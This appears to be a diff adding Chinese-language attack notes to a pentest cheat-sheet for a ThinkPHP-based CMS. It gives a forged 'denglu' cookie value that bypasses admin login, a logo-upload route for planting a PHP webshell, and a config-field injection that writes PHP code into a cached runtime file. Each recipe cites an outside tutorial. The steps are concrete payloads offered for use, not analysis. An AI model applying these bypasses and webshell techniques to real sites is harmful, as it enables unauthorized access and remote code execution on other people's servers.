@@ -30,3 +30,38 @@ RCE：
 
 ```
 
+后台登陆绕过登陆
+
+- 教程：https://www.freebuf.com/articles/web/254396.html
+
+- 将cookie中denglu参数改成（otype是权限，token是验证）
+
+```
+denglu=think:{"otype":"3","userid":"","username":"","token":"3c341b110c44ad9e7da4160e4f865b63"}
+```
+
+后台get5he11 -1
+
+- 教程：https://www.freebuf.com/articles/web/254396.html
+
+```
+/参数设置/基本设置/LOGO/选择文件/
+通过源代码查看logo处可以看到路径，一般在public/uploads/20210101/md5.php
+```
+
+后台get5he11 -2
+
+- 教程：https://forum.90sec.com/t/topic/988
+
+```
+/参数设置/添加配置/依次输入test、test、test、文本、参数配置
+/参数设置/参数设置/在test拦中输入 ：
+ "
+phpinfo();//
+访问前端页面进行缓存刷新后直接访问：
+/runtime/cache/3a/8e4c06e471595f6eb262bb9b5582d9.php
+
+PS：如果没有参数设置，可能只是删除了导航，没有删除实际功能
+可以直接访问/setup/addsetup.html  添加配置
+```
+
